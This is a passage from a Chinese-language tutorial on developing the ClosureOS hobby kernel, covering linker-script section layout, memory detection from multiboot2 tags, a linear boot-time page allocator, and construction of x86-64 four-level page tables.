class="hljs-comment">*(.ltext)</span><br><span class="hljs-comment">*(.ltext.*)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_text_end = .;<br>__kernel_text_sz = __kernel_text_end - __kernel_text_base;<br><br>KERN_DATA_BASE = 0xFFFFFF8010000000;<br>. = KERN_DATA_BASE;<br>__kernel_data_base = .;<br><br>.data ALIGN(4096) : AT (__kernel_text_sz + __boot_end)<br>&#123;<br><span class="hljs-comment">*(.data)</span><br><span class="hljs-comment">*(.ldata)</span><br><br><span class="hljs-comment">/* we have to set these arraies aligned to 8 bytes */</span><br>. = ALIGN(8);<br><br>__init_array = .;<br><span class="hljs-comment">*(.init_array)</span><br>__init_array_end = .;<br>__fini_array = .;<br><span class="hljs-comment">*(.fini_array)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_data_end = .;<br>__kernel_data_sz = __kernel_data_end - __kernel_data_base;<br><br>KERN_RODATA_BASE = 0xFFFFFF8020000000;<br>. = KERN_RODATA_BASE;<br>__kernel_rodata_base = .;<br><br>.rodata ALIGN(4096) : AT (__kernel_data_sz + __kernel_text_sz + __boot_end)<br>&#123;<br><span class="hljs-comment">*(.rodata)</span><br><span class="hljs-comment">*(.rodata.*)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_rodata_end = .;<br>__kernel_rodata_sz = __kernel_rodata_end - __kernel_rodata_base;<br><br>KERN_BSS_BASE = 0xFFFFFF8030000000;<br>. = KERN_BSS_BASE;<br>__kernel_bss_base = .;<br><br>.bss ALIGN(4096) : AT (__kernel_rodata_sz + __kernel_data_sz + __kernel_text_sz + __boot_end)<br>&#123;<br><span class="hljs-comment">*(COMMON)</span><br><span class="hljs-comment">*(.bss)</span><br><span class="hljs-comment">*(.lbss)</span><br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_bss_end = .;<br>__kernel_bss_sz = __kernel_bss_end - __kernel_bss_base;<br><br>. = ALIGN(4096);<br><br>__kernel_end = .;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x01-内存探测，临时内存分配器，页表重建"><a href="#0x01-内存探测，临时内存分配器，页表重建" class="headerlink" title="0x01. 内存探测，临时内存分配器，页表重建"></a>0x01. 内存探测，临时内存分配器，页表重建</h1><h2 id="内存容量获取与线性内存分配器"><a href="#内存容量获取与线性内存分配器" class="headerlink" title="内存容量获取与线性内存分配器"></a>内存容量获取与线性内存分配器</h2><p>在初始化内存管理器之前，首先我们需要知道当前究竟有多少内存，熟悉 BIOS 下 OS 开发的同学肯定对BIOS <code>0x15</code> 中断的 <code>0xE820</code> 、<code>0xE801</code> 、<code>0x88</code> 这三板斧再熟悉不过了，然而在 UEFI 启动中我们是无法使用 legacy BIOS 的中断进行内存探测的</p><p>万幸的是在 UEFI 中同样有类似的接口供我们获取内存容量——<a href="https://uefi.org/htmlspecs/ACPI_Spec_6_4_html/15_System_Address_Map_Interfaces/uefi-getmemorymap-boot-services-function.html">UEFI GetMemoryMap()</a>，不过在我们的系统当中，通过该接口获取内存容量的任务是由 EFI 程序 Grub 完成的—— <strong>得益于 multiboot2 规范的存在，我们可以直接从 multiboot2 header 中获取到内存容量</strong> </p><p><a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Boot-information-format">multiboot2 规范</a>中 Memory Map 段的 tag 格式如下，其中 <code>size</code> 为 tag header 加上 所有 entry 的大小， <code>entry_size</code> 为单条 entry 的大小：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u32     |<span class="hljs-string"> type = 6          </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>u32     |<span class="hljs-string"> entry_size        </span>|<br>u32     |<span class="hljs-string"> entry_version     </span>|<br>varies  |<span class="hljs-string"> entries           </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>每个 entry 的格式如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u64     |<span class="hljs-string"> base_addr         </span>|<br>u64     |<span class="hljs-string"> length            </span>|<br>u32     |<span class="hljs-string"> type              </span>|<br>u32     |<span class="hljs-string"> reserved          </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>我们简单写一个示例函数（非正式代码）进行测试：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">boot_mm_test</span><span class="hljs-params">(<span class="hljs-type">multiboot_uint8_t</span> *mbi)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag</span> *tag;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag_mmap</span> *mmap_tag = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> mmap_entry_nr;<br><br>    <span class="hljs-keyword">for</span> (tag = (<span class="hljs-keyword">struct</span> multiboot_tag *) (mbi + <span class="hljs-number">8</span>);<br>         tag-&gt;type != MULTIBOOT_TAG_TYPE_END;<br>         tag = (<span class="hljs-keyword">struct</span> multiboot_tag *)<br>                 ((<span class="hljs-type">multiboot_uint8_t</span> *) tag + ((tag-&gt;size + <span class="hljs-number">7</span>) &amp; ~<span class="hljs-number">7</span>))) &#123;<br>        <span class="hljs-keyword">if</span> (tag-&gt;type == MULTIBOOT_TAG_TYPE_MMAP) &#123;<br>            mmap_tag = (<span class="hljs-keyword">struct</span> multiboot_tag_mmap*) tag;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!mmap_tag) &#123;<br>        <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] Unable to find mmap tag in multiboot info! Halting...&quot;</span>);<br>        <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot; hlt; &quot;</span>)</span></span>;<br>    &#125;<br><br>    mmap_entry_nr = (mmap_tag-&gt;size - <span class="hljs-built_in">sizeof</span>(*mmap_tag)) / <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> multiboot_mmap_entry);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;[*] Memory region &quot;</span>);<br>        <span class="hljs-built_in">boot_printnum</span>(i);<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;, addr: 0x&quot;</span>);<br>        <span class="hljs-built_in">boot_printhex</span>(mmap_tag-&gt;entries[i].addr);<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;, size: 0x&quot;</span>);<br>        <span class="hljs-built_in">boot_printhex</span>(mmap_tag-&gt;entries[i].len);<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;, type: &quot;</span>);<br>        <span class="hljs-built_in">boot_printnum</span>(mmap_tag-&gt;entries[i].type);<br>        <span class="hljs-built_in">boot_putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到我们有不少内存段，但其中绝大部分都是不可作为内存使用的保留段（<code>type ==2</code>），我们能用来作为内存使用的只有 <code>type==1</code> 的段：</p><blockquote><p>这些保留段包括 MMIO 区域等</p></blockquote><p><img src="https://s2.loli.net/2024/06/16/PogROmLe2KjQwi3.png"></p><p>现在让我们正式开始编写与内存管理相关的代码，类似于内核需要分步装载（boot loader 到 kernel），我们的内存管理器同样采用 <strong>分步走</strong> 的设计思路：</p><ul><li>先创建一个最基本的内存管理器，由其分配正式的内存管理器所需的内存，再启用正式的内存管理器</li></ul><p>这个内存分配器的作用 <strong>仅</strong> 是为我们接下来创建正式的内存管理器进行内存分配，因此我们 <strong>不需要考虑释放内存的情况，直接线性地分配可用内存空间即可</strong> ，为了简化此阶段的内存分配模型，这里我们限定每次分配的内存大小为单张内存页：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag_mmap</span> *mmap_tag = <span class="hljs-literal">nullptr</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> mmap_entry_nr;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_mmap_entry</span> *curr_entry = <span class="hljs-literal">nullptr</span>;<br><span class="hljs-type">int</span> curr_entry_idx = <span class="hljs-number">-1</span>;<br>mm::<span class="hljs-type">phys_addr_t</span> curr_avail, curr_end;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Linear allocator without releasing, alloc a page each time.</span><br><span class="hljs-comment"> * Note that the result could be physical 0, NULL should not be use as failure,</span><br><span class="hljs-comment"> * but a -EMOMEM or some other error number should be returned.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_page_alloc_internal</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span>*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *res;<br><br>    <span class="hljs-comment">/* initialization */</span><br>    <span class="hljs-keyword">if</span> (!curr_entry) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (curr_entry_idx + <span class="hljs-number">1</span>); i &lt; mmap_entry_nr; i++) &#123;<br>            <span class="hljs-keyword">if</span> (mmap_tag-&gt;entries[i].type == MULTIBOOT_MEMORY_AVAILABLE) &#123;<br>                mm::<span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr;<br>                mm::<span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br><br>                <span class="hljs-keyword">if</span> (base &gt; end) &#123;<br>                    <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] FATAL ERROR: &quot;</span><br>                              <span class="hljs-string">&quot;integeter overflow at parsing multiboot tags&quot;</span>);<br>                    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot; hlt; &quot;</span>)</span></span>;<br>                &#125;<br><br>                <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * we&#x27;d like to give up the first and last partial page,</span><br><span class="hljs-comment">                 * as it&#x27;s not enough for use to use</span><br><span class="hljs-comment">                */</span><br>                base = <span class="hljs-built_in">PAGE_ALIGN</span>(base);<br>                end &amp;= PAGE_MASK;<br>                <br>                <span class="hljs-comment">/* available region may be less than 1 page, ignore */</span><br>                <span class="hljs-keyword">if</span> ((end &lt; base) || ((end - base) &lt; PAGE_SIZE)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                curr_avail = base;<br>                curr_end = end;<br>                curr_entry = &amp;mmap_tag-&gt;entries[i];<br>                curr_entry_idx = i;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!curr_entry) &#123;<br>        <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] FATAL ERROR: NO MEMORY AVAILABLE!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ERR_PTR</span>(-ENOMEM);<br>    &#125;<br><br>    res = (<span class="hljs-type">void</span>*) curr_avail;<br>    curr_avail += PAGE_SIZE;<br><br>    <span class="hljs-keyword">if</span> (curr_avail == curr_end) &#123;<br>        curr_entry = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的一点是， <strong>我们的内核本体便位于可用内存区域</strong> ，因此在进行内存分配时我们应当跳过这些区域，得益于 Multiboot 规范的存在， boot loader 会向我们提供一个如下格式的 tag 来存放 ELF 各节的信息：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u32     |<span class="hljs-string"> type = 9          </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>u16     |<span class="hljs-string"> num               </span>|<br>u16     |<span class="hljs-string"> entsize           </span>|<br>u16     |<span class="hljs-string"> shndx             </span>|<br>u16     |<span class="hljs-string"> reserved          </span>|<br>varies  |<span class="hljs-string"> section headers   </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>ELF 格式是 *nix 系统中常用的可执行程序的格式，也是我们的 ClosureOS kernel 文件的格式，简单理解可以认为其由一个 ELF header 存储总的信息，由一个 header table 存储不同 section 的信息，简而言之一个 ELF 文件应当长这个样子：</p><p><img src="https://i.loli.net/2021/06/03/boZ8nCURBOXfdQH.png" alt="ELF 格式提供了两种基本视图：链接视图与执行视图，区别大概就是链接后会把相同的段整合在一起"></p><p>更加详细的细节笔者就不赘叙了，感兴趣的可以自行参考 <a href="https://refspecs.linuxfoundation.org/elf/elf.pdf">Linux Foundation - Executable and Linking Format (ELF) Specification</a> ，这里我们简单介绍一下 section header 的格式，multiboot2 elf tag 提供给我们的 section headers 和 ELF 中的 section header table 是一样的，都是一个如下所示结构体的数组，不同的是 <code>sh_offset</code> 段被 GRUB 填上其相对于 ELF 加载起始地址的偏移（在上一篇文章中，我们在链接脚本中将这个起始地址设为 <code>1M</code> ）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">elf64_shdr</span> &#123;<br>    elf64_word  sh_name;<br>    elf64_word  sh_type;<br>    elf64_xword sh_flags;<br>    elf64_addr  sh_addr;<br>    elf64_off   sh_offset;<br>    elf64_xword sh_size;<br>    elf64_word  sh_link;<br>    elf64_word  sh_info;<br>    elf64_xword sh_addr_align;<br>    elf64_xword sh_ent_size;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>至于为什么是 section header 而不是 program header，总之 multiboot2 specification 就是这么定义的…</p></blockquote><p>这里我们简单写一个 wrapper 在每次进行内存分配之后将地址与 ELF tag 中各 section 的地址范围进行对比，若刚好位于 ELF 范围则重新进行内存分配，这里我们仅考虑 <code>shdr-&gt;sh_type == SHT_PROGBITS</code> 的情况，因为 <code>.text</code> 等段都是这个类型，其他的一些例如 <code>.symtab</code> 等段对于我们程序运行而言其实并不重要；此外我们仅考虑 <code>shdr-&gt;sh_flags</code> 包含 <code>SHF_ALLOC</code> 的情况，只有存在该标志位才表示这个段在运行时需要内存</p><blockquote><p>至于 <code>.bss</code> 段，我们所获得的类型为 <code>shdr-&gt;sh_type == SHT_NOBITS</code> ，因为这个段的数据全为 0，所以在这里我们可以暂时忽略，等到后续重建高端内核内存映射时再分配这个段的空间</p></blockquote><p>此外，我们还需要避免覆写掉 multiboot tags 所在的区域以及 frame buffer 所在区域：</p><blockquote><p>实际上，frame buffer 的内存区域通常并不直接来自 RAM，而是来自显卡，不过保险起见这里多加一份检查</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag_elf_sections</span> *elf_info_tag = <span class="hljs-literal">nullptr</span>;<br>mm::<span class="hljs-type">phys_addr_t</span> multiboot_tag_start, multiboot_tag_end;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">addr_is_in_used_range</span><span class="hljs-params">(mm::<span class="hljs-type">phys_addr_t</span> addr)</span> -&gt; <span class="hljs-type">bool</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">elf64_shdr</span> *shdr;<br>    <span class="hljs-type">void</span> *shdr_end;<br>    mm::<span class="hljs-type">phys_addr_t</span> seg_start, seg_end;<br><br>    <span class="hljs-comment">/* in ELF range */</span><br>    shdr_end = (<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) &amp;elf_info_tag-&gt;sections<br>               + elf_info_tag-&gt;num * <span class="hljs-built_in">sizeof</span>(*shdr));<br><br>    <span class="hljs-keyword">for</span> (shdr = (elf64_shdr*) &amp;elf_info_tag-&gt;sections;<br>         (<span class="hljs-type">void</span>*) shdr &lt; shdr_end;<br>         shdr = (elf64_shdr*) ((mm::<span class="hljs-type">phys_addr_t</span>) shdr + <span class="hljs-built_in">sizeof</span>(*shdr))) &#123;<br><br>        <span class="hljs-keyword">if</span> ((shdr-&gt;sh_type != SHT_PROGBITS)<br>            || !(shdr-&gt;sh_flags &amp; SHF_ALLOC)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        seg_start = <span class="hljs-number">0x100000</span> + shdr-&gt;sh_offset;<br>        seg_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_start + shdr-&gt;sh_size);<br><br>        <span class="hljs-keyword">if</span> (addr &gt;= seg_start &amp;&amp; addr &lt; seg_end) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* in frame buffer */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">boot_tty_has_fb</span>()) &#123;<br>        <span class="hljs-keyword">if</span> ((addr &gt;= (mm::<span class="hljs-type">phys_addr_t</span>) boot_fb_base)<br>            &amp;&amp; (addr &lt;= (mm::<span class="hljs-type">phys_addr_t</span>) boot_fb_end)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* in multiboot tags */</span><br>    <span class="hljs-keyword">if</span> ((addr &gt;= multiboot_tag_start) &amp;&amp; (addr &lt;= multiboot_tag_end)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="页表重建立"><a href="#页表重建立" class="headerlink" title="页表重建立"></a>页表重建立</h2><p>有了临时的动态内存分配器，现在我们可以开始 <strong>建立一个常规的四级页表，并将内核本体对应的物理内存映射到高端内存空间</strong> ，完成这一部分的初始化工作之后我们的后续工作都将在高半部内核完成</p><p>首先是页表映射的建立，页表主要用于将由页表所定义的虚拟地址空间映射到物理地址空间上，在 CPU 进行内存访问时内存管理单元（Memory Management Unit）会根据页表将虚拟地址翻译（translate）成物理地址，在纯 64 位模式下虚拟地址的最大长度为 8 字节，在兼容模式下虚拟地址仅能用前 4 字节，且需要额外经历基于分段的翻译， <strong>我们的 ClosureOS 为纯 64 位系统，暂时不考虑 32 位的情况</strong> ：</p><blockquote><p>注： <em>本章</em> 暂时不考虑 <em>翻译后备缓冲区</em> （Translation Lookaside Buffer），感兴趣的同学可以先自行了解</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129170947.png" alt="amd64 下的页表翻译过程"></p><p>64 位下最常用的是 4 级页表结构，页顶级表的地址被存放在 CR3 寄存器中，通常情况下一张内存页被设定为 4KB，单条页表项的长度为 8 字节：</p><ul><li>对于虚拟地址而言，前 12 位被用来表示内存页内的偏移；对于页表项而言，前 12 位用于存放页权限等信息</li><li>剩下的 36 位每 9 位用来表示在页表不同级别的偏移，开启 5 级分页后额外多用 9 位表示第 5 级的偏移，否则作为保留位</li><li>剩下 7 位用作扩展</li></ul><p><img src="https://s2.loli.net/2024/06/20/SvC9YmyWuphJosO.png" alt="4 级页表结构，来自 AMD64 Architecture Programmer&#39;s Manual Volume 2"></p><p>纯 64 位模式下，4K 页的页表项结构如下：</p><p><img src="https://s2.loli.net/2024/06/20/QoBCNTfJPAzwvxr.png"></p><p>前 12 位的各位说明如下：</p><ul><li><strong>AVL</strong>：available，该页是否可用，可忽略</li><li><strong>G</strong>：是否为<strong>全局页</strong>，全局页会被保存在 TLB 中方便调用；1为是</li><li><strong>PAT</strong>：页属性表位，用以在分级页表中设定页的属性，这里暂且先置0</li><li><strong>D</strong>：Dirty，当一张内存页被写入时，CPU会将该页<strong>标脏</strong>，仅针对页表项有效</li><li><strong>A</strong>：Accessed，该页每次被访问时该位都会被置1，定期清零，置1次数用以表示使用频率</li><li><strong>PCD</strong>：Page-level Cache Disable，0 为启用高速缓存，1 为禁止</li><li><strong>PWT</strong>：Page-level Write-Through，页级通写位，与高速缓存有关，这里暂且置 0</li><li><strong>US</strong>：User&#x2F;Supervisor，权限位，1 时 ring0~ring3 均可访问该页，0时仅 ring0~ring2 可访问（一般来说操作系统只需要用到 ring0 与 ring3）</li><li><strong>RW</strong>：即 Read&#x2F;Write，该位为 1 时该页可读写，否则只可读不可写</li><li><strong>P</strong>：Present，即该页是否存在，0 表示该页不存在于物理页中，此时对该页的访问会引发缺页异常</li></ul><p>我们的 ClosureOS 使用的是常规的 4 级页表与 4KB 页大小，因为这更适合我们对不同的内存区域进行更加细粒度的映射管理，对于页表的映射建立操作，我们只需要直接分配各级页表项的空间后写入即可，这里需要注意的是 <strong>高级页目录表项权限会限制低级页表项的权限，因此对于存在映射的虚拟内存区域，除了最后一级页表项以外的页目录表项我们都应当给予可写的权限</strong> ：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PDE_DEFAULT     (PDE_ATTR_P | PDE_ATTR_RW)</span><br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_map</span><span class="hljs-params">(mm::<span class="hljs-type">phys_addr_t</span> pgtable,</span></span><br><span class="hljs-params"><span class="hljs-function">                                mm::<span class="hljs-type">virt_addr_t</span> va,</span></span><br><span class="hljs-params"><span class="hljs-function">                                mm::<span class="hljs-type">phys_addr_t</span> pa, </span></span><br><span class="hljs-params"><span class="hljs-function">                                mm::<span class="hljs-type">page_attr_t</span> attr)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">pgd_t</span> *pgd;<br>    <span class="hljs-type">pud_t</span> *pud;<br>    <span class="hljs-type">pmd_t</span> *pmd;<br>    <span class="hljs-type">pte_t</span> *pte;<br>    <span class="hljs-type">int</span> pgd_i = <span class="hljs-built_in">PGD_ENTRY</span>(va);<br>    <span class="hljs-type">int</span> pud_i = <span class="hljs-built_in">PUD_ENTRY</span>(va);<br>    <span class="hljs-type">int</span> pmd_i = <span class="hljs-built_in">PMD_ENTRY</span>(va);<br>    <span class="hljs-type">int</span> pte_i = <span class="hljs-built_in">PTE_ENTRY</span>(va);<br><br>    pgd = (<span class="hljs-type">pgd_t</span>*) pgtable;<br>    <span class="hljs-keyword">if</span> (!pgd[pgd_i]) &#123;<br>        pgd[pgd_i] = (<span class="hljs-type">pgd_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) pgd[pgd_i])) &#123;<br>            pgd[pgd_i] = (<span class="hljs-type">pgd_t</span>) <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) pgd[pgd_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pgd[pgd_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pud = (<span class="hljs-type">pud_t</span>*) (pgd[pgd_i] &amp; PAGE_MASK);<br>    <span class="hljs-keyword">if</span> (!pud[pud_i]) &#123;<br>        pud[pud_i] = (<span class="hljs-type">pud_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) pud[pud_i])) &#123;<br>            pud[pud_i] = (<span class="hljs-type">pud_t</span>) <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span 